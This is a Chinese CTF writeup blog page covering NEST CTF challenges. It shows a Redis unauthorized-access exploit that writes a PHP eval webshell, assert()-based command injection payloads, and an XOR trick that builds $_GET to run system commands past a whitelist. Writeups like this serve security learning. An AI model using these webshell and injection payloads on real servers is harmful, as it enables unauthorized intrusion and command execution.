@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  
+  
+  <title>NEST CTF答题夺旗赛(第一季)Writeup | W4rnIn9</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="WriteUp,比赛,">
+  
+
+
+  
+    <meta name="description" content="网络安全爱好者 CTFer">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+  <script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+</head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JONER</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a href="/" target="_self">
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a href="/archives/" target="_self">
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path>
+          
+            <a href="javascript:void(0);" v-else>我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a href="https://github.com/joner11234" target="_blank">
+                    Github
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>NEST CTF答题夺旗赛(第一季)Writeup</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2019-09-14
+    </span>
+    
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <p>​    本次比赛时间9月9日10:00-9月13日23:59，每天放出三道题，题目包含Web、Reverse、Misc，可以说做题时间非常充足了，但是由于是个人赛，而我也只接触过一点Web和Misc，所以整个做题的过程还是比较艰难的，毕竟和师傅们比，自己学的东西还是太少了，下面是一些题目的记录，都是些相对简单的题目。</p>
+<h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><blockquote>
+<p>题目类型:Web</p>
+<p>题目难度:⭐</p>
+</blockquote>
+<p><img src="/article/eac4b7e9/1568432044511.png" alt="1568432044511"></p>
+<blockquote>
+<p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivotal赞助。</p>
+<p>Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。<br>攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件。</p>
+<p>如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。</p>
+</blockquote>
+<p>​    一看到题目名字和下面的6379首先想到的就是Redis未授权访问漏洞，然后打开上面的网址，是一个<code>phpinfo()</code>页面，猜测是通过这个页面获得网站地址，然后利用Redis未授权漏洞写入webshell获得flag，这是只推测，具体还要看实际操作中会遇到什么问题。</p>
+<p>​    通过查看<code>phpinfo()</code>可以看到网站的目录是/www</p>
+<p><img src="/article/eac4b7e9/1568434662618.png" alt="1568434662618"></p>
+<p>首先尝试连接redis写入webshell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 39.106.94.18		#连接redis</span><br><span class="line">39.106.94.18&gt; config set dir /www	</span><br><span class="line">39.106.94.18&gt; config get dbfilename shell.php</span><br><span class="line">39.106.94.18&gt; set x "&lt;?php eval(@$_POST['a']); ?&gt;"</span><br><span class="line">39.106.94.18&gt; save</span><br></pre></td></tr></table></figure>
+<p>然后访问<a href="http://39.106.94.18/shell.php" target="_blank" rel="noopener">http://39.106.94.18/shell.php</a> 发现写入的一句话存在而且被解析了，使用蚁剑连接</p>
+<p><img src="/article/eac4b7e9/1568435332971.png" alt="1568435332971"></p>
+<p>然后查看网站首页的代码</p>
+<p><img src="/article/eac4b7e9/1568435411362.png" alt="1568435411362"></p>
+<p>找到flag在/home/flag，这里即使找不到也要耐心找找，毕竟都已经一查看所有文件了，而且权限还是root，不要像下面这样拿到了shell还找不到flag</p>
+<p><img src="/article/eac4b7e9/1568435585943.png" alt="1568435585943"></p>
+<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><blockquote>
+<p>题目类型:Web</p>
+<p>题目难度:⭐</p>
+</blockquote>
+<p><img src="/article/eac4b7e9/1568435681733.png" alt="1568435681733"></p>
+<p>打开是一个简单的网站，访问各页面得到关键提示</p>
+<p><img src="/article/eac4b7e9/1568435743812.png" alt="1568435743812"></p>
+<p>扫了一下目录得到index.php.bak</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"waf.php"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">	$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$file = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$file=str_replace(<span class="string">"./"</span>,<span class="string">""</span>,$file);</span><br><span class="line">$file=str_replace(<span class="string">".\\"</span>,<span class="string">""</span>,$file);</span><br><span class="line">$para = <span class="string">"templates/"</span> . $file . <span class="string">".php"</span>;</span><br><span class="line">assert(<span class="string">"file_exists('$para')"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">		&lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"IE=edge"</span>&gt;</span><br><span class="line">		&lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span><br><span class="line"></span><br><span class="line">		&lt;title&gt;My PHP Website&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">		&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css"</span> /&gt;</span><br><span class="line">	&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;nav class="navbar navbar-inverse navbar-fixed-top"&gt;</span><br><span class="line">			&lt;div class="container"&gt;</span><br><span class="line">		    	&lt;div class="navbar-header"&gt;</span><br><span class="line">		    		&lt;button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar"&gt;</span><br><span class="line">		            	&lt;span class="sr-only"&gt;Toggle navigation&lt;/span&gt;</span><br><span class="line">		            	&lt;span class="icon-bar"&gt;&lt;/span&gt;</span><br><span class="line">		            	&lt;span class="icon-bar"&gt;&lt;/span&gt;</span><br><span class="line">		            	&lt;span class="icon-bar"&gt;&lt;/span&gt;</span><br><span class="line">		          	&lt;/button&gt;</span><br><span class="line">		          	&lt;a class="navbar-brand" href="#"&gt;Project name&lt;/a&gt;</span><br><span class="line">		        &lt;/div&gt;</span><br><span class="line">		        &lt;div id="navbar" class="collapse navbar-collapse"&gt;</span><br><span class="line">		          	&lt;ul class="nav navbar-nav"&gt;</span><br><span class="line">		            	&lt;li &lt;?php if ($file == "home") &#123; ?&gt;class="active"&lt;?php &#125; ?&gt;&gt;&lt;a href="?file=home"&gt;Home&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		            	&lt;li &lt;?php if ($file == "about") &#123; ?&gt;class="active"&lt;?php &#125; ?&gt;&gt;&lt;a href="?file=about"&gt;About&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		            	&lt;li &lt;?php if ($file == "tips") &#123; ?&gt;class="active"&lt;?php &#125; ?&gt;&gt;&lt;a href="?file=tips"&gt;Tips&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">						&lt;li &lt;?php if ($file == "flag") &#123; ?&gt;class="active"&lt;?php &#125; ?&gt;&gt;&lt;a href="?file=flag"&gt;Flag&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		          	&lt;/ul&gt;</span><br><span class="line">		        &lt;/div&gt;</span><br><span class="line">		    &lt;/div&gt;</span><br><span class="line">		&lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">		&lt;div class="container" style="margin-top: 50px"&gt;</span><br><span class="line">			<span class="meta">&lt;?php</span></span><br><span class="line">				<span class="keyword">require_once</span> $para;</span><br><span class="line">			<span class="meta">?&gt;</span></span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;script src=<span class="string">"http://code.jquery.com/jquery-latest.js"</span> /&gt;</span><br><span class="line">		&lt;script src=<span class="string">"http://libs.baidu.com/bootstrap/3.0.3/js/bootstrap.min.js"</span> /&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>简单看了一下，感觉assert()这个有点可疑，因为经常看到一句话木马用这个函数，所以查了一下资料</p>
+<blockquote>
+<p>assert()简介：判断一个表达式是否成立。返回true or false。<br><strong>当参数为字符串时，会被当作php代码执行</strong></p>
+</blockquote>
+<p>所以可能就是闭合file_exists()函数，然后利用assert()执行命令，但是尝试php读取文件的函数发现被waf.php拦截了，所以想到了直接使用system()函数执行系统命令，最好编一下码。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">123') or system("tac dockerenv");# 				#编码前</span><br><span class="line"><span class="meta">123%</span><span class="bash">27)%20or%20system(%22tac%20.dockerenv%20/flag%22);%23		<span class="comment">#编码后</span></span></span><br></pre></td></tr></table></figure>
+<p>这里说一下为什么是这个命令，因为这个题是由waf的，所以导致一些函数和命令无法执行，我只尝试了几个命令，如果情况很复杂可以用burp fuzz一下，这道题屏蔽了php读取文件的函数，还有<code>cat</code>、<code>ls</code>这些命令，但是没有屏蔽find命令，首先使用<code>find / flag</code> 找一下flag</p>
+<p><img src="/article/eac4b7e9/15.png" alt="15"></p>
+<p>然后因为不能使用<code>cat</code>命令，尝试了一下<code>tac</code>可以使用，所以构造上面的参数获得flag</p>
+<p><img src="/article/eac4b7e9/09-58.png" alt="09-58"></p>
+<h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><blockquote>
+<p>题目类型:Web</p>
+<p>题目难度:⭐⭐</p>
+</blockquote>
+<p><img src="/article/eac4b7e9/1568437933122.png" alt="1568437933122"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag  </span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;  </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="comment">//例子 c=20-1  </span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];  </span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">60</span>) &#123;  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];  </span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp  </span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>,  <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span> , <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">//帮你算出答案  </span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​    打开就是这些php代码，感觉有点印象，后来想起来是国赛选拔赛的题目，因为但是并没有做出来，所以印象不是非常深。</p>
+<p>​    这道题首先给我的感觉就是用数学函数构造出要执行的命令，使用eval()执行命令，然后找flag，但是我看了看这些函数，没发现一个可以转换出字母来的。</p>
+<p>​    后来在百度上搜了一下师傅们的writeup，发现清一色的都是使用了<code>base_convert()</code>和<code>dechex()</code>这两个函数，然后我看了看这里的源码，有两处改动，首先是字符长度限制由80改为了60然后是白名单了把<code>base_convert()</code>和<code>dechex()</code>去掉了，本来以为是白给的300分，原来并不是这么简单，因为搜到的所有writeup都是用到了上面两个函数并且长度都在70-80之间，所以当时我感觉这道题是做不出来了，但是别的都是逆向了，也不会做，就只能肝这道题。</p>
+<p>​    首先分析一下这个题目，首先对参数c进行长度判断，太长直接结束，后面是正则匹配，除了白名单中的数学函数之外的字母和字符串都不能使用，然后一切的转机就在发现了rand^(x).(x)这个操作，可以通过异或来构造出大写英文字符，因为这里限制了60个字符，单纯这样构造出system()这些肯定会超出长度，如果能构造出<code>$_GET</code>或者<code>$_POST</code>就能忽略他的字符串长度限制了，然后使用rand^(7).(5)构造出了 ET ，使用is_nan^(6).(4)构造出了 _G，然后只要构造出<code>$_GET[a] ( $_GET[b])</code>使a=system，b为要执行的命令，即可执行任意命令，而且不受长度限制。</p>
+<p>因为不能使用[ ]，这个可以使用{ }来代替，而变量可以使用函数中的字符，只有这些是被允许的，想要构造出$_GET 需要使用变量覆盖，即 $pi=’_GET’;$$pi 覆盖后成功构造出 $_GET,最终构造出</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;$pi=(is_nan^(6).(4)).(rand^(7).(5));$$pi&#123;atan&#125;($$pi&#123;atanh&#125;)&amp;atan=system&amp;atanh=find / flag</span><br></pre></td></tr></table></figure>
+<p>查找一下flag,还是那个路径</p>
+<p><img src="/article/eac4b7e9/09-37.png" alt="09-37"></p>
+<p>获取flag</p>
+<p><img src="/article/eac4b7e9/09-14.png" alt="09-14"></p>
+<p>这道题真的是艰难</p>
+<p> 关于为什么使用rand^().()能构造出字母，关键是异或运算，这里的异或运算是指，取每个字符的ASCII，转成二进制再做运算，因为不能使用白名单数学函数以外的字符串，所以只能使用这些函数里的字符，如<code>rand</code>、<code>pi</code>、<code>is_nan</code>,所以理论上是可以构造出任意字符组合的，这里可以自己写个脚本实现。</p>
+<h2 id="easy-misc-puzzle"><a href="#easy-misc-puzzle" class="headerlink" title="easy_misc_puzzle"></a>easy_misc_puzzle</h2><blockquote>
+<p>题目类型:Misc</p>
+<p>题目难度:⭐</p>
+</blockquote>
+<p><img src="/article/eac4b7e9/1568442499692.png" alt="1568442499692"></p>
+<p>下载了是一个压缩包，解压后是一堆小图片，感觉像是二维码，之前做过拼图的题，所以第一反应就是拼图。</p>
+<p><img src="/article/eac4b7e9/1568442668938.png" alt="1568442668938"></p>
+<p>然后注意到这个png图并不是透明的，看一下文件头，这是一个jpg图片，所以把后缀都改成jpg，拖到ps里栅格化一下图层再用魔法棒抠一下图，在PS拼起来</p>
+<p><img src="/article/eac4b7e9/1568442657094.png" alt="1568442657094"></p>
+<p><img src="/article/eac4b7e9/1568442861126.png" alt="1568442861126"></p>
+<p>这个真的简单</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://p0sec.net/index.php/archives/69/" target="_blank" rel="noopener">redis未授权访问漏洞利用总结</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
+<p><a href="https://www.freebuf.com/articles/web/186298.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/186298.html</a></p>
+<p><a href="https://www.jianshu.com/p/00fc814aa6d2" target="_blank" rel="noopener">https://www.jianshu.com/p/00fc814aa6d2</a></p>
+    </div>
+  </div>
+  
+    <div class="copy-right">
+      <div class="markdown-body">
+        <blockquote>
+        
+        
+          本文作者 : JONER <br>
+        
+        原文链接 : <a href>http://joner11234.github.io/article/eac4b7e9.html</a><br>
+        版权声明 : 本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+        </blockquote>
+      </div>
+    </div>
+  
+  
+  
+    <div class="social-share" style="margin-top: -2rem" data-wechat-qrcode-title="<p>微信扫一扫</p>" data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>" data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter">
+  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
+</div>
+<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async></script>
+  
+
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/WriteUp/">
+              #WriteUp
+            </a>
+          </span>
+          
+          <span class="span--tag">
+            <a href="/tags/比赛/">
+              #比赛
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/article/56b64430.html" target="_self">CVE-2019-0708远程桌面代码执行漏洞复现</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/article/a6638bb3.html" target="_self">Java反序列化检测及漏洞复现</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "1NXTyN2WX8S3WVndpU432Q6j-gzGzoHsz",
+      appKey: "qKRwkiwKUs1Q6PynhoYXoF4t",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+   
+
+</div>
+
+
+      <footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <p class="site-info">
+    博客已运行<span id="time-to-now"></span><span class="my-face">👦</span>
+    <br>
+    
+  </p>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2019, 3, 2).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
